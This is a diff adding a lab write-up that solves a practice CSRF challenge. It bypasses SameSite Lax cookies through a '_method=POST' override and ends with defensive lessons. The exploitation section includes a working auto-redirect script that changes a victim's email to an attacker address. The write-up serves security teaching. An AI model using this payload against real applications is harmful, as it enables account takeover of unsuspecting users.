@@ -1,0 +1,65 @@
+================================
+LAB: SameSite Lax bypass via method override
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 09, 2026
+Lab URL: https://0a2c001d036649ee80cd037100c20049.web-security-academy.net
+Category: CSRF
+Level: Practitioner
+Objective: Perform a CSRF attack that changes the victim's email address
+Description: The lab's change email function is vulnerable to CSRF. The application uses SameSite Lax cookies but accepts HTTP method override parameters, allowing CSRF attacks via GET requests that are treated as POST.
+
+[RECONNAISSANCE]
+----------------
+Logged in as wiener:peter and tested the email change functionality.
+
+Intercepted legitimate email change request:
+POST /my-account/change-email HTTP/2
+Content-Type: application/x-www-form-urlencoded
+email=test%40test.ca
+
+Response: 302 Found redirect to /my-account?id=wiener
+
+Tested for method override support by converting POST to GET with _method parameter:
+GET /my-account/change-email?email=test@test.ca&_method=POST
+
+Result: 302 redirect - method override accepted by backend.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Application uses SameSite=Lax cookies, which normally prevent CSRF on POST requests from cross-site origins.
+
+However, the backend accepts the _method=POST query parameter to override HTTP method, treating GET requests as POST.
+
+SameSite Lax allows cookies to be sent with top-level GET navigations from external sites, bypassing the CSRF protection when combined with method override.
+
+[EXPLOITATION]
+--------------
+Payload: HTML page with auto-redirecting script
+
+<script>
+    window.location = 'https://0a2c001d036649ee80cd037100c20049.web-security-academy.net/my-account/change-email?email=hacked@evil.com&_method=POST';
+</script>
+
+Steps:
+1. Hosted payload on exploit server
+2. Changed email parameter to attacker-controlled address
+3. Delivered exploit to victim
+4. Victim's browser performed top-level navigation (GET request)
+5. SameSite Lax allowed session cookie to be sent
+6. Backend processed _method=POST, executing email change
+
+[EVIDENCE]
+----------
+Lab marked as solved after delivering exploit to victim.
+Victim's email successfully changed via CSRF despite SameSite Lax protection.
+
+[LESSONS LEARNED]
+-----------------
+- SameSite Lax only protects against cross-site POST/PUT/DELETE/PATCH but allows GET with cookies in top-level navigation
+- HTTP method override parameters (_method, X-HTTP-Method-Override header) can bypass SameSite Lax when accepted by backend
+- Defense: Disable method override on sensitive endpoints or validate that actual HTTP method matches intended operation
+- Defense: Use SameSite=Strict for sensitive cookies, or implement additional CSRF tokens even with SameSite Lax
+- Method override is a legacy feature for frameworks/browsers that don't support all HTTP verbs - rarely needed in modern applications
